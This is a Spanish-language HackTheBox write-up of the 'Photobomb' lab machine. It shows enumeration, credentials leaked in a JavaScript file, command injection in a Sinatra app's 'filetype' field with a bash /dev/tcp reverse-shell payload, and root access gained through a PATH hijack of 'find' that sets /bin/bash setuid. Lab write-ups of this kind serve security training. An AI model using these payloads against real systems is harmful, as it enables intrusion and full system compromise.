---
title: Writeup Photobomb HTB
author: rabb1t
date: 2023-02-11
categories: [HackTheBox, Writeup, Machines, Linux]
tags: [ruby, command-injection, sinatra, BurpSuite, PATH-Hijacking]
math: false
mermaid: true
image:
  path: https://www.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png
  width: 180
  height: 180
---
La máquina photobomb cuenta con un servicio web en el cual hay un panel de autenticación básico, en él podremos registrarnos gracias a unas credenciales que están en la propia web. Después de haber ingresado, tendremos que analizar las peticiones que se envían. Encontraremos una vulnerabilidad de CI (Command Injection) porque no se está sanitizando bien las entradas; con lo cual, podremos acceder al usuario sin privilegios del sistema. En la escalada de privilegios tendremos un archivo que podemos ejecutar con permisos de superusuario, y haciendo un secuestro de un binario, nos convertiremos en el usuario root.

## Índice 
- [Información básica de la máquina](#máquina-photobomb)
- [Herramientas y recursos empleados](#herramientas-y-recursos-empleados)
- [Enumeración](#enumeración)
- [Ejecutando comandos (Command Injection)](#ejecutando-comandos-command-injection)
	- [Obteniendo una shell como wizard](#obteniendo-una-shell-como-wizard)
	- [Analizando código ruby de servicio web](#analizando-código-ruby-de-servicio-web)
- [Escalando privilegios](#escalando-privilegios)
	- [Analizando código y secuestro del path](#analizando-código-y-secuestro-del-path)
	- 
## Máquina Photobomb

| IP     	   |10.10.11.182|
|--------------|------------|
| OS		   | Linux	    |
| Dificultad   | Fácil      |
| Creador	   | Nauten  	|

## Herramientas y recursos empleados
- Herramientas
	- nmap
	- whatweb
	- BurpSuite
	- TShark

-----

## Enumeración
Comenzamos realizando un escaneo con nmap a la máquina víctima:
```shell
# nmap -sCV -Pn -n -oN scope.txt 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.094s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Como no contamos con credenciales para conectarnos por SSH (puerto 22), vamos a enumerar el servicio que corre por el puerto 80 (HTTP). Vemos que hay un redireccionamiento al dominio _photobomb_ así que agregamos este subdominio con la extensión (.htb) al `/etc/hosts` con su respectiva IP.

Ahora usamos la herramienta __whatweb__ para tener un poco más de información de la web:

```shell
rabb1t@hold:~$ whatweb http://photobomb.htb
[200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux] nginx/1.18.0 (Ubuntu), IP[10.10.11.182], Script Title[Photobomb],UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

No hay nada relevante además de saber que el servidor es __nginx__ ejecutándose en un sistema operativo Ubuntu. Veamos qué nos encontramos en la página:

![Web photobomb](/assets/favicon/2023-02-11/photobomb1.png)

"click here!" nos lleva a un [panel](http://photobomb.htb/printer) convencional de inicio de sesión:
![Web photobomb](/assets/favicon/2023-02-11/photobomb2.png)

Antes de aplicar fuerza bruta a las rutas o subdominios, revisemos el código fuente:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
```

Vemos un archivo javascript llamado "photobomb.js". Veamos qué contiene:

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
Hay una función la cual "pre-propula" las credenciales para el soporte técnico en la página. La función busca una cookie llamada "isPhotoBombTechSupport" y si existe, establece un atributo "href" al elemento con clase "creds" con la URL. La función se ejecuta cuando la página haya terminado de cargar. Y bueno, tiene credenciales, así que probamos en el panel de autenticación básico y vemos lo siguiente:
![Web photobomb](/assets/favicon/2023-02-11/photobomb3.png)

Si probamos las credenciales por SSH no tenemos acceso, no sería tan fácil después de todo :/

Como no sabemos el tipo de tecnología que se está empleando, podemos aprovecharnos de los errores que el servidor retorne. En este caso he apuntado al archivo "index.php" (muy común en aplicativos PHP), y aparece el siguiente error:

![Web photobomb](/assets/favicon/2023-02-11/photobomb4.png)
Con esto podemos deducir que se está empleando ruby para el aplicativo web.

Revisando el código fuente en esta ruta de la web, vemos que se hace una petición por POST:
```html
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <form id="photo-form" action="/printer" method="post">
      <h3>Select an image</h3>
      <fieldset id="image-wrapper">
      <input type="radio" name="photo" value="voicu-apostol-MWER49YaD-M-unsplash.jpg" id="voicu-apostol-MWER49YaD-M-unsplash.jpg" checked="checked" /><label for="voicu-apostol-MWER49YaD-M-unsplash.jpg" style="background-image: url(ui_images/voicu-apostol-MWER49YaD-M-unsplash.jpg)"></label><input type="radio" name="photo" value="masaaki-komori-NYFaNoiPf7A-unsplash.jpg" id="masaaki-komori-NYFaNoiPf7A-unsplash.jpg"/><label for="masaaki-komori-NYFaNoiPf7A-unsplash.jpg" style="background-image: url(ui_images/masaaki-komori-NYFaNoiPf7A-unsplash.jpg)"></label><input type="radio" name="photo" value="andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg" id="andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg"/><label for="andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg" style="background-image: url(ui_images/andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg)"></label><input type="radio" name="photo" value="tabitha-turner-8hg0xRg5QIs-unsplash.jpg" id="tabitha-turner-8hg0xRg5QIs-unsplash.jpg"/><label for="tabitha-turner-8hg0xRg5QIs-unsplash.jpg" style="background-image: url(ui_images/tabitha-turner-8hg0xRg5QIs-unsplash.jpg)"></label><input type="radio" name="photo" value="nathaniel-worrell-zK_az6W3xIo-unsplash.jpg" id="nathaniel-worrell-zK_az6W3xIo-unsplash.jpg"/><label for="nathaniel-worrell-zK_az6W3xIo-unsplash.jpg" style="background-image: url(ui_images/nathaniel-worrell-zK_az6W3xIo-unsplash.jpg)"></label><input type="radio" name="photo" value="kevin-charit-XZoaTJTnB9U-unsplash.jpg" id="kevin-charit-XZoaTJTnB9U-unsplash.jpg"/><label for="kevin-charit-XZoaTJTnB9U-unsplash.jpg" style="background-image: url(ui_images/kevin-charit-XZoaTJTnB9U-unsplash.jpg)"></label><input type="radio" name="photo" value="calvin-craig-T3M72YMf2oc-unsplash.jpg" id="calvin-craig-T3M72YMf2oc-unsplash.jpg"/><label for="calvin-craig-T3M72YMf2oc-unsplash.jpg" style="background-image: url(ui_images/calvin-craig-T3M72YMf2oc-unsplash.jpg)"></label><input type="radio" name="photo" value="eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg" id="eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg"/><label for="eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg" style="background-image: url(ui_images/eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg)"></label><input type="radio" name="photo" value="finn-whelen-DTfhsDIWNSg-unsplash.jpg" id="finn-whelen-DTfhsDIWNSg-unsplash.jpg"/><label for="finn-whelen-DTfhsDIWNSg-unsplash.jpg" style="background-image: url(ui_images/finn-whelen-DTfhsDIWNSg-unsplash.jpg)"></label><input type="radio" name="photo" value="almas-salakhov-VK7TCqcZTlw-unsplash.jpg" id="almas-salakhov-VK7TCqcZTlw-unsplash.jpg"/><label for="almas-salakhov-VK7TCqcZTlw-unsplash.jpg" style="background-image: url(ui_images/almas-salakhov-VK7TCqcZTlw-unsplash.jpg)"></label><input type="radio" name="photo" value="mark-mc-neill-4xWHIpY2QcY-unsplash.jpg" id="mark-mc-neill-4xWHIpY2QcY-unsplash.jpg"/><label for="mark-mc-neill-4xWHIpY2QcY-unsplash.jpg" style="background-image: url(ui_images/mark-mc-neill-4xWHIpY2QcY-unsplash.jpg)"></label><input type="radio" name="photo" value="wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg" id="wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg"/><label for="wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg" style="background-image: url(ui_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg)"></label>
      </fieldset>
      <fieldset id="image-settings">
      <label for="filetype">File type</label>
      <select name="filetype" title="JPGs work on most printers, but some people think PNGs give better quality">
        <option value="jpg">JPG</option>
        <option value="png">PNG</option>
        </select>
      <div class="product-list">
        <input type="radio" name="dimensions" value="3000x2000" id="3000x2000" checked="checked"/><label for="3000x2000">3000x2000 - mousemat</label>
        <input type="radio" name="dimensions" value="1000x1500" id="1000x1500"/><label for="1000x1500">1000x1500 - mug</label>
        <input type="radio" name="dimensions" value="600x400" id="600x400"/><label for="600x400">600x400 - phone cover</label>
        <input type="radio" name="dimensions" value="300x200" id="300x200"/><label for="300x200">300x200 - keyring</label>
        <input type="radio" name="dimensions" value="150x100" id="150x100"/><label for="150x100">150x100 - usb stick</label>
        <input type="radio" name="dimensions" value="30x20" id="30x20"/><label for="30x20">30x20 - micro SD card</label>
      </div>
      </fieldset>
      <div class="controls">
        <button type="submit">download photo to print</button>
      </div>
    </form>
  </div>
</body>
</html>
```

## Ejecutando comandos (Command Injection)

Cuando analizamos la petición con __Burp Suite__, encontramos los parámetros enviados en el formulario visto anteriormente. Hice modificaciones en el valor de _filetype_, comenzando con un punto y coma para revisar la reacción, lo que sucedió fue que el servidor me devolvió un error 500.

Llegado a cierto punto intenté inyectar un comando de consola, pero no recibía respuesta, así que envié una traza ICMP a mi máquina y esperé a que apareciera con _tshark_ `ping+-c+1+10.10.14.73`:

### tshark

```shell
rabb1t@hold:~$ sudo tshark --color -nni any icmp
Capturing on 'any'
 ** (tshark:10598) 00:46:00.576112 [Main MESSAGE] -- Capture started.
 ** (tshark:10598) 00:46:00.576211 [Main MESSAGE] -- File: "/tmp/wireshark_anyXF07V1.pcapng"
    1 0.000000000  10.10.14.73 → 10.10.14.73  ICMP 100 Echo (ping) request  id=0x000a, seq=1/256, ttl=64
    2 0.000022668  10.10.14.73 → 10.10.14.73  ICMP 100 Echo (ping) reply    id=0x000a, seq=1/256, ttl=64 (request in 1)
    3 30.026726631 10.10.11.182 → 10.10.14.73  ICMP 100 Echo (ping) request  id=0x0003, seq=1/256, ttl=63
    4 30.026761095  10.10.14.73 → 10.10.11.182 ICMP 100 Echo (ping) reply    id=0x0003, seq=1/256, ttl=64 (request in 3)
^C4 packets captured
```

Obtuvimos respuesta de la máquina, así que está ejecutando comandos. Procedemos a conectarnos a la máquina víctima por medio de una shell inversa, en mi caso he usado la siguiente carga útil `png;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.73/4434+0>%261`:

## Obteniendo una shell como wizard
![BurpSuite photobomb petición](/assets/favicon/2023-02-11/photobomb5.png)
```shell
rabb1t@hold:~$ nc -nlvp 4434           
Listening on 0.0.0.0 4434
Connection received on 10.10.11.182 50650
bash: cannot set terminal process group (732): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$
```
Obtenemos acceso. Realizamos el tratamiento de la tty y comenzamos a enumerar el sistema como el usuario wizard.

## Analizando código ruby de servicio web
Vamos a ver cómo se está ejecutando el aplicativo para revisar el porqué nos permite inyectar comandos, el siguiente código está en el archivo `server.rb`:

```ruby
require 'sinatra'

set :public_folder, 'public'

get '/' do

  html = <<~HTML
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
HTML

  content_type :html
  return html
end

get '/printer' do

  images = ''
  checked = ' checked="checked" '
  Dir.glob('public/ui_images/*.jpg') do |jpg_filename|
    img_src = jpg_filename.sub('public/', '')
    img_name = jpg_filename.sub('public/ui_images/', '')
    images += '<input type="radio" name="photo" value="' + img_name + '" id="' + img_name + '"' + checked + '/><label for="' + img_name + '" style="background-image: url(' + img_src + ')"></label>'
    checked = ''
  end

  html = <<~HTML
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <form id="photo-form" action="/printer" method="post">
      <h3>Select an image</h3>
      <fieldset id="image-wrapper">
      #{images}
      </fieldset>
      <fieldset id="image-settings">
      <label for="filetype">File type</label>
      <select name="filetype" title="JPGs work on most printers, but some people think PNGs give better quality">
        <option value="jpg">JPG</option>
        <option value="png">PNG</option>
        </select>
      <div class="product-list">
        <input type="radio" name="dimensions" value="3000x2000" id="3000x2000" checked="checked"/><label for="3000x2000">3000x2000 - mousemat</label>
        <input type="radio" name="dimensions" value="1000x1500" id="1000x1500"/><label for="1000x1500">1000x1500 - mug</label>
        <input type="radio" name="dimensions" value="600x400" id="600x400"/><label for="600x400">600x400 - phone cover</label>
        <input type="radio" name="dimensions" value="300x200" id="300x200"/><label for="300x200">300x200 - keyring</label>
        <input type="radio" name="dimensions" value="150x100" id="150x100"/><label for="150x100">150x100 - usb stick</label>
        <input type="radio" name="dimensions" value="30x20" id="30x20"/><label for="30x20">30x20 - micro SD card</label>
      </div>
      </fieldset>
      <div class="controls">
        <button type="submit">download photo to print</button>
      </div>
    </form>
  </div>
</body>
</html>
HTML

  content_type :html
  return html
end

post '/printer' do
  photo = params[:photo]
  filetype = params[:filetype]
  dimensions = params[:dimensions]

  # handle inputs
  if photo.match(/\.{2}|\//)
    halt 500, 'Invalid photo.'
  end

  if !FileTest.exist?( "source_images/" + photo )
    halt 500, 'Source photo does not exist.'
  end

  if !filetype.match(/^(png|jpg)/)
    halt 500, 'Invalid filetype.'
  end

  if !dimensions.match(/^[0-9]+x[0-9]+$/)
    halt 500, 'Invalid dimensions.'
  end

  case filetype
  when 'png'
    content_type 'image/png'
  when 'jpg'
    content_type 'image/jpeg'
  end

  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else
    puts "File already exists."
  end

  if File.exists?('resized_images/' + filename)
    halt 200, {}, IO.read('resized_images/' + filename)
  end

  #message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype
  message = 'Failed to generate a copy of ' + photo
  halt 500, message
end
```
Vemos que para la validación en el atributo "filetype" debe comenzar ya sea con "jpg" o "png" con una expresión regular. Lo que hay después, lo ignora o no lo valida, por ello podemos inyectar comandos. Además, hay una línea donde ejecuta directamente lo que hay en la cadena del atributo "filetype", así que usar ";" nos permite inyectar un nuevo comando como parte de la misma línea.

## Escalando privilegios
Primeramente ejecutamos el comando `sudo -l` para revisar los permisos a nivel de sudoers (dentro del archivo sudoers), y así ver si nos han asignado alguno:

```shell
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~/photobomb$
```
Podemos cambiar las variables de entorno y ejecutar el script `cleanup.sh`. 

## Analizando código y secuestro del path
Veamos qué tiene el archivo:
```shell
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh 
#!/bin/bash
./opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
wizard@photobomb:~/photobomb$
```

Hay algo que llama bastante la atención, el comando `find` no tiene ruta absoluta, así que esto nos indica que podemos hacer un secuestro del path y ejecutar comandos arbitrarios como el usuario root (teniendo en cuenta también los permisos asignados):

Nos desplazamos a la ruta `tmp`, creamos un nuevo archivo llamado `find` (como el comando), dentro de él escribimos la instrucción que queremos ejecutar una vez se procese el archivo `/opt/cleanup.sh` llegado al punto de ejecutar el comando `find` dentro de él. Le damos todos los permisos (777), actualizamos el `PATH` con nuestra nueva ruta donde estará nuestro archivo malicioso (`/tmp`) y ejecutamos el comando que nos han asignado a nivel de `sudoers` como `sudo`. Es decir `/opt/cleanup.sh`. Revisamos el `UID` del binario `/bin/bash` para asegurarnos que todo ha salido bien. Tiene el permiso `s`. El documento lo podemos ejecutar como superusuario:
```shell
wizard@photobomb:~/photobomb$ cd /tmp
wizard@photobomb:/tmp$ echo 'chmod u+s /bin/bash' > find
wizard@photobomb:/tmp$ chmod 777 find
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
wizard@photobomb:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
wizard@photobomb:/tmp$
```

Ejecutamos el binario `/bin/bash` con el parámetro `-p`, el cual nos indica que vamos a iniciar sesión interactiva con una shell Bash con permisos de superusuario:
```shell
wizard@photobomb:/tmp$ /bin/bash -p
bash-5.0\# whoami
root
bash-5.0\#
```

¡Happy Hacking!

